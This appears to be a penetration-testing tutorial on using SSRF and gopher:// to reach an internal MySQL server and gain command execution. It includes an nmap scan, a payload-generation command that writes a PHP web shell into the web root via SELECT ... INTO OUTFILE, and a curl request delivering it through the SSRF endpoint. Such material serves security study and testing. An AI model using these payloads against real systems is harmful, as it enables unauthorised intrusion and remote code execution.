---
title: Exploiting MySQL with SSRF for Command Execution
description: Learn leveraging SSRF and gopher:// to exploit MySQL vulnerabilities.
keywords:
- MySQL exploitation
- SSRF
- gopher protocol
- command execution
- MySQL native protocol
- SQL payloads
- web shell
- server-side request forgery
---

# MySQL Exploitation

## Context

This article focuses on exploiting MySQL databases using Server-Side Request Forgery (SSRF) to achieve command execution. By leveraging the gopher:// protocol, attackers can interact with MySQL services via SSRF endpoints, crafting payloads based on the MySQL native protocol. The reader is expected to have a basic understanding of MySQL protocol, SQL syntax, SSRF, and general command execution techniques.

## Theory

### MySQL SSRF Attack Surface

MySQL SSRF exploitation entails leveraging an SSRF vulnerability to interact with MySQL services using crafted protocol payloads. SSRF can be utilized to target internal MySQL services by sending raw protocol data directly over the gopher:// protocol. The attack sequence involves crafting gopher:// payloads that send MySQL protocol commands via an SSRF endpoint, potentially leading to command execution.

### Gopher Protocol for MySQL Exploitation

The gopher:// protocol enables attackers to deliver arbitrary TCP payloads, effectively bypassing standard HTTP constraints. By encoding MySQL native protocol packets within a gopher:// payload, attackers can send these packets over internal ports accessible from the vulnerable service, which may include MySQL.

### MySQL Native Protocol Abuse

The MySQL native protocol defines how clients communicate with MySQL servers, managing tasks such as authentication and query execution. Unauthenticated MySQL instances or those with weak credentials become vulnerable targets. Attackers can send meticulously crafted MySQL protocol packets to execute SQL commands, which can potentially lead to command execution.

### SQL Payloads for Command Execution

Certain SQL queries, such as `SELECT ... INTO OUTFILE` or User-Defined Functions (UDFs) like `sys_exec`, can be exploited to trigger OS-level command executions. SSRF can be harnessed to deliver such SQL payloads that either write web shells to accessible directories or execute system-level commands directly.

## Practice

### SSRF to MySQL Command Execution via gopher://

- **Identify SSRF Endpoint**: Locate a web application feature that allows SSRF with custom URL schemes. This is often found in web services that fetch data from URLs provided by users, such as URL previews or webhooks.

- **Scan for MySQL Service**: Use network scanning tools to identify if an internal MySQL service is accessible from the SSRF vantage point.

    ```bash
    nmap -p 3306 <target_internal_ip>
    ```

- **Craft MySQL Native Protocol Payload**: Use tools or scripts to generate binary payloads for the MySQL protocol. The key is to create payloads for authentication and desired query execution.

    ```bash
    python3 mysql-gopher.py --host <mysql_host> --user <user> --password <pass> --query "SELECT '<?php system($_GET['cmd']); ?>' INTO OUTFILE '/var/www/html/shell.php';" --output gopher
    ```

- **Send Payload via SSRF**: Trigger the SSRF to deliver the crafted payload to the internal MySQL server.

    ```bash
    curl 'http://vulnerable-app/ssrf?url=gopher://<mysql_host>:3306/_<payload>'
    ```

    Make sure to replace `<payload>` with the URL-encoded MySQL protocol data.

- **Access the Web Shell**: Verify successful command execution by accessing the uploaded shell, allowing you to execute arbitrary commands on the target system.

The above steps, when executed correctly, can lead to effective remote command execution by exploiting SSRF vulnerabilities to interact with a MySQL service.

## Tools

- **mysql-gopher**
- **nmap**
- **curl**